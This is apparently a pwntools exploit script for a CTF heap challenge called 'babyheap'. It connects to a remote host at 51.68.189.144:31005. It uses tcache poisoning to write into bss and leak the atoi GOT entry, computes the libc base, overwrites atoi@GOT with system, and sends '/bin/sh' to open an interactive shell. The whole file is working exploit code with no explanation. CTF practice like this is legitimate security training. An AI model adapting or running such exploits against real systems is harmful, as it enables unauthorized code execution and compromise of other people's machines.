#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
# n = process('./babyheap')
n = remote("51.68.189.144", 31005)
elf = ELF('./babyheap')
libc = ELF('./libc.so.6') #2.26


def choice(idx):
    n.recvuntil('> ')
    n.sendline(str(idx))

def new():
    choice(1)

def edit(content):
    choice(2)
    n.recvuntil('Content? ')
    n.sendline(content)

def show():
    choice(3)

def free():
    choice(4)

def readn(content):
    choice(1337)
    n.recvuntil('Fill ')
    n.send(content)


bss = elf.bss()+0x20
log.success(hex(bss))
atoi_got = elf.got['atoi']
log.success(hex(atoi_got))

new()
free()
edit(p64(bss))
new()
# gdb.attach(n)
payload = p64(0)*5 + p64(atoi_got)
readn(payload)
show()
n.recvuntil('Content: ')
libc_base = u64(n.recv(6)+'\x00\x00')-libc.sym['atoi']
print "libc_base:",hex(libc_base)
system_addr = libc_base + libc.sym['system']
edit(p64(system_addr)) #atoi_got -> system_addr
choice('/bin/sh\x00')

n.interactive()
